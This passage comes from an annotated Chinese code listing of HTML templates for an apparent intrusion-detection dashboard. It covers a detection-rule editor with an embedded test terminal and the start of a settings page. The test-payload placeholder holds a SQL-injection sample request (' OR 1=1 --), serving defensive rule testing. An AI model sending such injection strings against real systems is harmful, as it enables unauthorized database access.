| 31 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>已启用 <strong id="count-enabled">0</strong></span>` |
| 32 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 33 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div id="active-chips" class="page-header__meta" aria-label="活动筛选条件"></div>` |
| 34 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 35 | 空行：分隔模板结构。 | `&nbsp;` |
| 36 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="filter-bar" aria-label="规则筛选">` |
| 37 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 38 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="filter-bar__label">类型</span>` |
| 39 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="btn-group" role="group" aria-label="按类型筛选">` |
| 40 | 按钮控件：提供可点击操作入口。 | `        <button class="btn is-active" type="button" data-type="">全部</button>` |
| 41 | 按钮控件：提供可点击操作入口。 | `        <button class="btn" type="button" data-type="signature">特征</button>` |
| 42 | 按钮控件：提供可点击操作入口。 | `        <button class="btn" type="button" data-type="threshold">阈值</button>` |
| 43 | 按钮控件：提供可点击操作入口。 | `        <button class="btn" type="button" data-type="anomaly">异常</button>` |
| 44 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 45 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 46 | 空行：分隔模板结构。 | `&nbsp;` |
| 47 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 48 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-enabled">启用状态</label>` |
| 49 | 输入控件：收集用户填写或选择的数据。 | `      <select id="filter-enabled" class="form-select">` |
| 50 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="">全部</option>` |
| 51 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="true">仅启用</option>` |
| 52 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="false">仅禁用</option>` |
| 53 | 标签闭合：结束当前 HTML 元素。 | `      </select>` |
| 54 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 55 | 空行：分隔模板结构。 | `&nbsp;` |
| 56 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group filter-bar__search">` |
| 57 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-query">搜索</label>` |
| 58 | 输入控件：收集用户填写或选择的数据。 | `      <input` |
| 59 | 文本内容：作为页面可见文案或模板数据。 | `        id="filter-query"` |
| 60 | 文本内容：作为页面可见文案或模板数据。 | `        class="form-input form-input--mono"` |
| 61 | 文本内容：作为页面可见文案或模板数据。 | `        type="search"` |
| 62 | 文本内容：作为页面可见文案或模板数据。 | `        placeholder="名称 / 特征 / 描述…"` |
| 63 | 文本内容：作为页面可见文案或模板数据。 | `        autocomplete="off"` |
| 64 | 文本内容：作为页面可见文案或模板数据。 | `      />` |
| 65 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 66 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 67 | 空行：分隔模板结构。 | `&nbsp;` |
| 68 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="card" aria-label="规则列表">` |
| 69 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__header">` |
| 70 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `      <h3 class="card__title">检测规则</h3>` |
| 71 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span id="list-status" class="text-tertiary" style="font-size: var(--fs-caption)"></span>` |
| 72 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 73 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__body">` |
| 74 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div style="overflow-x: auto">` |
| 75 | HTML 结构：定义 `table` 元素及其属性或内容。 | `        <table class="table" id="rules-table">` |
| 76 | HTML 结构：定义 `thead` 元素及其属性或内容。 | `          <thead>` |
| 77 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr>` |
| 78 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 48px" class="center">启用</th>` |
| 79 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th>规则名称</th>` |
| 80 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 84px">类型</th>` |
| 81 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th>特征 / 表达式</th>` |
| 82 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 90px">动作</th>` |
| 83 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 80px">等级</th>` |
| 84 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 72px" class="num">优先级</th>` |
| 85 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 72px" class="num">命中</th>` |
| 86 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 180px">更新时间</th>` |
| 87 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 200px">操作</th>` |
| 88 | 标签闭合：结束当前 HTML 元素。 | `            </tr>` |
| 89 | 标签闭合：结束当前 HTML 元素。 | `          </thead>` |
| 90 | HTML 结构：定义 `tbody` 元素及其属性或内容。 | `          <tbody id="rules-tbody">` |
| 91 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr>` |
| 92 | HTML 结构：定义 `td` 元素及其属性或内容。 | `              <td colspan="10" class="alert-list__empty">` |
| 93 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="loader" aria-hidden="true"></span>` |
| 94 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span style="margin-left: 8px">加载中…</span>` |
| 95 | 标签闭合：结束当前 HTML 元素。 | `              </td>` |
| 96 | 标签闭合：结束当前 HTML 元素。 | `            </tr>` |
| 97 | 标签闭合：结束当前 HTML 元素。 | `          </tbody>` |
| 98 | 标签闭合：结束当前 HTML 元素。 | `        </table>` |
| 99 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 100 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 101 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 102 | 空行：分隔模板结构。 | `&nbsp;` |
| 103 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- 新建/编辑抽屉（含内嵌测试终端） -#}` |
| 104 | HTML 结构：定义 `div` 元素及其属性或内容。 | `  <div id="drawer-overlay" class="drawer-overlay" aria-hidden="true"></div>` |
| 105 | HTML 结构：定义 `aside` 元素及其属性或内容。 | `  <aside` |
| 106 | 文本内容：作为页面可见文案或模板数据。 | `    id="rule-drawer"` |
| 107 | 文本内容：作为页面可见文案或模板数据。 | `    class="drawer drawer--wide"` |
| 108 | 文本内容：作为页面可见文案或模板数据。 | `    role="dialog"` |
| 109 | 文本内容：作为页面可见文案或模板数据。 | `    aria-modal="true"` |
| 110 | 文本内容：作为页面可见文案或模板数据。 | `    aria-labelledby="drawer-title"` |
| 111 | 文本内容：作为页面可见文案或模板数据。 | `    aria-hidden="true"` |
| 112 | 文本内容：作为页面可见文案或模板数据。 | `  >` |
| 113 | HTML 结构：定义 `header` 元素及其属性或内容。 | `    <header class="drawer__header">` |
| 114 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="drawer__title" id="drawer-title">` |
| 115 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span id="drawer-title-text" class="drawer__title-text">新建规则</span>` |
| 116 | 标签闭合：结束当前 HTML 元素。 | `      </h2>` |
| 117 | 按钮控件：提供可点击操作入口。 | `      <button class="drawer__close" id="drawer-close" type="button" aria-label="关闭">×</button>` |
| 118 | 标签闭合：结束当前 HTML 元素。 | `    </header>` |
| 119 | 空行：分隔模板结构。 | `&nbsp;` |
| 120 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="drawer__body">` |
| 121 | 表单结构：承载用户输入和提交动作。 | `      <form id="rule-form" autocomplete="off" onsubmit="return false">` |
| 122 | HTML 结构：定义 `section` 元素及其属性或内容。 | `        <section class="drawer__section">` |
| 123 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `          <h3 class="drawer__section-title">基本信息</h3>` |
| 124 | 空行：分隔模板结构。 | `&nbsp;` |
| 125 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group">` |
| 126 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="form-label" for="f-name">规则名称</label>` |
| 127 | 输入控件：收集用户填写或选择的数据。 | `            <input id="f-name" name="name" class="form-input" type="text" maxlength="80" required />` |
| 128 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="form-error" id="e-name" hidden></div>` |
| 129 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 130 | 空行：分隔模板结构。 | `&nbsp;` |
| 131 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group">` |
| 132 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="form-label" for="f-description">描述</label>` |
| 133 | 输入控件：收集用户填写或选择的数据。 | `            <textarea id="f-description" name="description" class="form-textarea" rows="2" maxlength="400"></textarea>` |
| 134 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 135 | 空行：分隔模板结构。 | `&nbsp;` |
| 136 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group" style="display: grid; grid-template-columns: 1fr 1fr; gap: var(--space-md)">` |
| 137 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div>` |
| 138 | HTML 结构：定义 `label` 元素及其属性或内容。 | `              <label class="form-label" for="f-type">类型</label>` |
| 139 | 输入控件：收集用户填写或选择的数据。 | `              <select id="f-type" name="type" class="form-select" required>` |
| 140 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="signature">signature（特征匹配）</option>` |
| 141 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="threshold">threshold（阈值）</option>` |
| 142 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="anomaly">anomaly（异常检测）</option>` |
| 143 | 标签闭合：结束当前 HTML 元素。 | `              </select>` |
| 144 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 145 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div>` |
| 146 | HTML 结构：定义 `label` 元素及其属性或内容。 | `              <label class="form-label" for="f-action">动作</label>` |
| 147 | 输入控件：收集用户填写或选择的数据。 | `              <select id="f-action" name="action" class="form-select" required>` |
| 148 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="alert">alert（告警）</option>` |
| 149 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="block">block（阻断）</option>` |
| 150 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="monitor">monitor（仅记录）</option>` |
| 151 | 标签闭合：结束当前 HTML 元素。 | `              </select>` |
| 152 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 153 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 154 | 空行：分隔模板结构。 | `&nbsp;` |
| 155 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group" style="display: grid; grid-template-columns: 1fr 1fr; gap: var(--space-md)">` |
| 156 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div>` |
| 157 | HTML 结构：定义 `label` 元素及其属性或内容。 | `              <label class="form-label" for="f-level">等级</label>` |
| 158 | 输入控件：收集用户填写或选择的数据。 | `              <select id="f-level" name="level" class="form-select" required>` |
| 159 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="low">低危</option>` |
| 160 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="medium">中危</option>` |
| 161 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="high" selected>高危</option>` |
| 162 | HTML 结构：定义 `option` 元素及其属性或内容。 | `                <option value="critical">严重</option>` |
| 163 | 标签闭合：结束当前 HTML 元素。 | `              </select>` |
| 164 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 165 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div>` |
| 166 | HTML 结构：定义 `label` 元素及其属性或内容。 | `              <label class="form-label" for="f-priority">优先级（1~999）</label>` |
| 167 | 输入控件：收集用户填写或选择的数据。 | `              <input id="f-priority" name="priority" type="number" min="1" max="999" value="100" class="form-input form-input--mono" />` |
| 168 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 169 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 170 | 空行：分隔模板结构。 | `&nbsp;` |
| 171 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group">` |
| 172 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="form-label" for="f-pattern">特征 / 表达式</label>` |
| 173 | 输入控件：收集用户填写或选择的数据。 | `            <textarea id="f-pattern" name="pattern" class="form-textarea form-input--mono" rows="3" placeholder="" required></textarea>` |
| 174 | HTML 结构：定义 `small` 元素及其属性或内容。 | `            <small id="f-pattern-hint" class="text-tertiary" style="font-size: var(--fs-caption)"></small>` |
| 175 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="form-error" id="e-pattern" hidden></div>` |
| 176 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 177 | 空行：分隔模板结构。 | `&nbsp;` |
| 178 | HTML 结构：定义 `label` 元素及其属性或内容。 | `          <label class="form-label" style="display: inline-flex; align-items: center; gap: var(--space-sm); margin-bottom: 0">` |
| 179 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="switch">` |
| 180 | 输入控件：收集用户填写或选择的数据。 | `              <input id="f-enabled" name="enabled" type="checkbox" checked />` |
| 181 | HTML 结构：定义 `span` 元素及其属性或内容。 | `              <span class="switch__track"></span>` |
| 182 | HTML 结构：定义 `span` 元素及其属性或内容。 | `              <span class="switch__thumb"></span>` |
| 183 | 标签闭合：结束当前 HTML 元素。 | `            </span>` |
| 184 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span style="text-transform: none; letter-spacing: 0">启用该规则</span>` |
| 185 | 标签闭合：结束当前 HTML 元素。 | `          </label>` |
| 186 | 标签闭合：结束当前 HTML 元素。 | `        </section>` |
| 187 | 空行：分隔模板结构。 | `&nbsp;` |
| 188 | HTML 结构：定义 `section` 元素及其属性或内容。 | `        <section class="drawer__section" id="section-test">` |
| 189 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `          <h3 class="drawer__section-title">规则测试 · 内嵌终端</h3>` |
| 190 | HTML 结构：定义 `p` 元素及其属性或内容。 | `          <p class="text-tertiary" style="font-size: var(--fs-caption); margin: 0 0 var(--space-sm)">` |
| 191 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span>在下方填测试样本，点击「运行测试」用当前抽屉内的规则评估。</span>` |
| 192 | 标签闭合：结束当前 HTML 元素。 | `          </p>` |
| 193 | 空行：分隔模板结构。 | `&nbsp;` |
| 194 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group">` |
| 195 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="form-label" for="t-payload">payload（用于 signature）</label>` |
| 196 | 输入控件：收集用户填写或选择的数据。 | `            <textarea id="t-payload" class="form-textarea form-input--mono" rows="2" placeholder="GET /admin?q=' OR 1=1 -- HTTP/1.1"></textarea>` |
| 197 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 198 | 空行：分隔模板结构。 | `&nbsp;` |
| 199 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group" style="display: grid; grid-template-columns: 1fr 1fr; gap: var(--space-md)">` |
| 200 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div>` |
| 201 | HTML 结构：定义 `label` 元素及其属性或内容。 | `              <label class="form-label" for="t-src-ip">src_ip</label>` |
| 202 | 输入控件：收集用户填写或选择的数据。 | `              <input id="t-src-ip" class="form-input form-input--mono" type="text" placeholder="203.0.113.10" />` |
| 203 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 204 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div>` |
| 205 | HTML 结构：定义 `label` 元素及其属性或内容。 | `              <label class="form-label" for="t-features">features（JSON，用于 threshold / anomaly）</label>` |
| 206 | 输入控件：收集用户填写或选择的数据。 | `              <input id="t-features" class="form-input form-input--mono" type="text"` |
| 207 | 文本内容：作为页面可见文案或模板数据。 | `                placeholder='{"packets_per_sec":2000,"failed_ratio":0.9}' />` |
| 208 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 209 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 210 | 空行：分隔模板结构。 | `&nbsp;` |
| 211 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="terminal" id="t-terminal" role="log" aria-live="polite">` |
| 212 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="terminal__line text-tertiary" style="font-style: italic">终端就绪：输入样本后运行测试。</div>` |
| 213 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="terminal__prompt">` |
| 214 | 输入控件：收集用户填写或选择的数据。 | `              <input id="t-input" class="terminal__input" type="text" placeholder="直接输入字符串作为 payload 并回车，或使用上方字段" />` |
| 215 | 按钮控件：提供可点击操作入口。 | `              <button class="btn btn--terminal btn--sm" id="t-run" type="button">运行测试</button>` |
| 216 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 217 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 218 | 标签闭合：结束当前 HTML 元素。 | `        </section>` |
| 219 | 标签闭合：结束当前 HTML 元素。 | `      </form>` |
| 220 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 221 | 空行：分隔模板结构。 | `&nbsp;` |
| 222 | HTML 结构：定义 `footer` 元素及其属性或内容。 | `    <footer class="drawer__footer">` |
| 223 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--ghost btn--sm" id="btn-drawer-cancel" type="button">取消</button>` |
| 224 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--danger btn--sm" id="btn-drawer-delete" type="button" hidden>删除</button>` |
| 225 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--primary btn--sm" id="btn-drawer-save" type="button">保存</button>` |
| 226 | 标签闭合：结束当前 HTML 元素。 | `    </footer>` |
| 227 | 标签闭合：结束当前 HTML 元素。 | `  </aside>` |
| 228 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 229 | 空行：分隔模板结构。 | `&nbsp;` |
| 230 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block page_scripts %}` |
| 231 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="{{ url_for('static', filename='js/rules.js') }}"></script>` |
| 232 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |

## `web/templates/settings.html`

- 类型：前端页面模板
- 行数：211

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% extends "base.html" %}` |
| 2 | 空行：分隔模板结构。 | `&nbsp;` |
| 3 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{#-` |
| 4 | 文本内容：作为页面可见文案或模板数据。 | `  系统设置（Settings）— Phase 7 Prompt §5` |
| 5 | 空行：分隔模板结构。 | `&nbsp;` |
| 6 | 文本内容：作为页面可见文案或模板数据。 | `  约束：` |
| 7 | 文本内容：作为页面可见文案或模板数据。 | `    - 可写区：检测灵敏度 / 告警阈值 / 告警邮箱 / 告警 Webhook / 模型版本 / 模型热更新` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `    - 只读区：JWT 过期时间 / API 限流 / CORS 白名单 / 日志完整性（均需改 .env 重启）` |
| 9 | 文本内容：作为页面可见文案或模板数据。 | `    - 真实 GET/PUT 绑定到 /api/settings；schema 由后端下发驱动字段渲染` |
| 10 | 文本内容：作为页面可见文案或模板数据。 | `    - 修改后「保存」→ 后端写入 _ServerState.settings，GET 立即能看到` |
| 11 | 文本内容：作为页面可见文案或模板数据。 | `-#}` |
| 12 | 空行：分隔模板结构。 | `&nbsp;` |
| 13 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block title %}系统设置 · AI Security Guardian{% endblock %}` |
| 14 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_title %}系统设置{% endblock %}` |
| 15 | 空行：分隔模板结构。 | `&nbsp;` |
| 16 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_actions %}` |
| 17 | HTML 结构：定义 `span` 元素及其属性或内容。 | `  <span class="text-tertiary" style="font-size: var(--fs-caption)">` |
| 18 | 文本内容：作为页面可见文案或模板数据。 | `    可写字段保存后立即对运行时生效；只读字段需修改 .env 并重启` |
| 19 | 标签闭合：结束当前 HTML 元素。 | `  </span>` |
| 20 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 21 | 空行：分隔模板结构。 | `&nbsp;` |
| 22 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block content %}` |
| 23 | HTML 结构：定义 `div` 元素及其属性或内容。 | `  <div class="settings-shell" id="settings-shell" aria-busy="true">` |
| 24 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 检测参数 ===== -#}` |
| 25 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="settings-section" data-group="detection">` |
| 26 | HTML 结构：定义 `header` 元素及其属性或内容。 | `      <header class="settings-section__header">` |
| 27 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="settings-section__title">检测参数</h3>` |
| 28 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span class="settings-section__caption">影响 AI 模型对流量的判定敏感度</span>` |
| 29 | 标签闭合：结束当前 HTML 元素。 | `      </header>` |
| 30 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="settings-section__body">` |
| 31 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field" data-field="detection_sensitivity">` |
| 32 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 33 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">检测灵敏度</span>` |
| 34 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint"></span>` |
| 35 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 36 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 37 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="slider-row">` |
| 38 | 输入控件：收集用户填写或选择的数据。 | `              <input type="range" data-bind="detection_sensitivity" />` |
| 39 | HTML 结构：定义 `span` 元素及其属性或内容。 | `              <span class="slider-value" data-bind-display="detection_sensitivity">—</span>` |
| 40 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 41 | HTML 结构：定义 `p` 元素及其属性或内容。 | `            <p class="settings-field__error" data-error="detection_sensitivity"></p>` |
| 42 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 43 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 44 | 空行：分隔模板结构。 | `&nbsp;` |
| 45 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field" data-field="alert_threshold">` |
| 46 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 47 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">告警触发阈值</span>` |
| 48 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint"></span>` |
| 49 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 50 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 51 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="slider-row">` |
| 52 | 输入控件：收集用户填写或选择的数据。 | `              <input type="range" data-bind="alert_threshold" />` |
| 53 | HTML 结构：定义 `span` 元素及其属性或内容。 | `              <span class="slider-value" data-bind-display="alert_threshold">—</span>` |
| 54 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 55 | HTML 结构：定义 `p` 元素及其属性或内容。 | `            <p class="settings-field__error" data-error="alert_threshold"></p>` |
| 56 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 57 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 58 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 59 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 60 | 空行：分隔模板结构。 | `&nbsp;` |
| 61 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 通知配置 ===== -#}` |
| 62 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="settings-section" data-group="notifications">` |
| 63 | HTML 结构：定义 `header` 元素及其属性或内容。 | `      <header class="settings-section__header">` |
| 64 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="settings-section__title">通知配置</h3>` |
| 65 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span class="settings-section__caption">严重告警触发时将推送到此处</span>` |
| 66 | 标签闭合：结束当前 HTML 元素。 | `      </header>` |
| 67 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="settings-section__body">` |
| 68 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field" data-field="alert_email">` |
| 69 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 70 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">告警邮箱</span>` |
| 71 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint"></span>` |
| 72 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 73 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control settings-field__control--wide">` |
| 74 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="settings-inline">` |
| 75 | 输入控件：收集用户填写或选择的数据。 | `              <input type="email" class="form-input" data-bind="alert_email" />` |
| 76 | 按钮控件：提供可点击操作入口。 | `              <button class="btn btn--ghost btn--sm" type="button" data-test="email">发送测试</button>` |
| 77 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 78 | HTML 结构：定义 `small` 元素及其属性或内容。 | `            <small class="settings-test-result" data-test-result="email"></small>` |
| 79 | HTML 结构：定义 `p` 元素及其属性或内容。 | `            <p class="settings-field__error" data-error="alert_email"></p>` |
| 80 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 81 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 82 | 空行：分隔模板结构。 | `&nbsp;` |
| 83 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field" data-field="alert_webhook">` |
| 84 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 85 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">告警 Webhook</span>` |
| 86 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint"></span>` |
| 87 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 88 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control settings-field__control--wide">` |
| 89 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="settings-inline">` |
| 90 | 输入控件：收集用户填写或选择的数据。 | `              <input type="url" class="form-input form-input--mono" data-bind="alert_webhook" />` |
| 91 | 按钮控件：提供可点击操作入口。 | `              <button class="btn btn--ghost btn--sm" type="button" data-test="webhook">试投</button>` |
| 92 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 93 | HTML 结构：定义 `small` 元素及其属性或内容。 | `            <small class="settings-test-result" data-test-result="webhook"></small>` |
| 94 | HTML 结构：定义 `p` 元素及其属性或内容。 | `            <p class="settings-field__error" data-error="alert_webhook"></p>` |
| 95 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 96 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 97 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 98 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 99 | 空行：分隔模板结构。 | `&nbsp;` |
| 100 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 模型 ===== -#}` |
| 101 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="settings-section" data-group="model">` |
| 102 | HTML 结构：定义 `header` 元素及其属性或内容。 | `      <header class="settings-section__header">` |
| 103 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="settings-section__title">模型配置</h3>` |
| 104 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span class="settings-section__caption">影响 /api/reports 中的 model_performance.version</span>` |
| 105 | 标签闭合：结束当前 HTML 元素。 | `      </header>` |
| 106 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="settings-section__body">` |
| 107 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field" data-field="model_version">` |
| 108 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 109 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">当前模型版本</span>` |
| 110 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint"></span>` |
